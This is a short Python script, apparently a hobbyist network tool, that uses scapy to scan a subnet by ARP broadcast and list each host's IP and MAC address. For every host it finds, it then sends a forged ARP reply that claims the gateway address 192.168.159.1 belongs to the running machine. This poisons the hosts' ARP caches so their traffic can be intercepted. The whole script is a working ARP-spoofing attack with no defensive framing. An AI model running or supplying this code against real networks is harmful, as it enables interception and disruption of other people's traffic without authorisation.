from scapy.all import *
import sys
from uuid import getnode as get_mac
mac = get_mac()
mac = ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))

def scan(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    client_list = []
    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        client_list.append(client_dict)
    return client_list

def spoof(ip):
    arp = ARP(op=2, psrc="192.168.159.1", pdst=ip, hwsrc=mac)
    pkt = send(arp)
    x = sniff(filter="arp", count=5, timeout=2)
    print (x.summary())
    print ("done")

def print_result(results_list):
    print("IP\t\t\tMAC Address\n-----------------------------------------")
    for client in results_list:
        print(client["ip"] + "\t\t" + client["mac"])
        spoof(client["ip"])





scan_result = scan(sys.argv[1])
print_result(scan_result)
